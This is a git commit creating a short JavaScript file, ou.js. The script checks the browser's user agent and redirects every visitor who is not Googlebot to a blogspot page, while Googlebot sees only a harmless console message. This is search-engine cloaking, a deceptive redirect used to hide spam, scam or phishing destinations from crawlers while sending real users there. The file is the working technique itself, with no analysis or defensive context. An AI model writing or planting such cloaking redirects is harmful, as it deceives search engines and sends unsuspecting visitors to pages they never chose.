ec96d2a8421c096848f61a36bfbe650b58830297
hamarirani7-sys <hamarirani7@gmail.com>
2026-09-23 22:25:09 +0600

    Create ou.js

---
+++ ou.js
@@ -0,0 +1,6 @@
+
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "https://9xxm.blogspot.com/2026/09/popo.html";
+} else {
+  console.log("Thanks for visiting my page" );
+}
